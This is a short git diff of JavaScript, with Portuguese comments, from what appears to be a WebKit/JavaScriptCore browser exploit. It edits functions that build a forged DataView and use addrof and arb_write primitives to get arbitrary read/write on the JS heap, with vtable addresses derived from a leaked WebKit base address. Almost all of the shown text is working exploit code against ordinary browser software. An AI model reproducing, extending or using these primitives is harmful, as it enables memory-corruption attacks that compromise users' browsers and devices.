@@ -54,10 +54,9 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
     let success = false; // Flag para controlar o fluxo de saída
 
     try {
-        // --- REMOVIDO TODO O BLOCO ANTERIOR DE VAZAMENTO DA STRUCTURE* DE UM DATAVIEW REAL USANDO OOB ORIGINAL ---
-        // Agora, o DATA_VIEW_STRUCTURE_VTABLE_ADDRESS é calculado na função chamadora (executeTypedArrayVictimAddrofAndWebKitLeak_R43)
-        // usando o webkit_base_address vazado e o offset estático da Structure* (vtable).
-        // Este é o endereço que será plantado para criar o fake DataView.
+        // --- NENHUM BLOCO DE VAZAMENTO DE STRUCTURE* DE DATAVIEW REAL AQUI.
+        // O dataViewStructureVtableAddress já é um valor calculado e confiável
+        // derivado do webkit_base_address vazado e do offset estático do vtable.
 
         // 1. Criar um objeto JavaScript simples que servirá como o "corpo" do nosso DataView forjado.
         const fake_dv_backing_object = {
@@ -159,7 +158,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     // Redirecionar o m_vector do DataView forjado para o endereço desejado
-    const fake_dv_backing_object_addr = addrof_core(_fake_data_view); // Endereço do objeto que serve de corpo para o _fake_data_view
+    const fake_dv_backing_object_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_OBJECT = fake_dv_backing_object_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
 
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, address, 8); // Manipula o corpo do fake DataView para apontar para 'address'
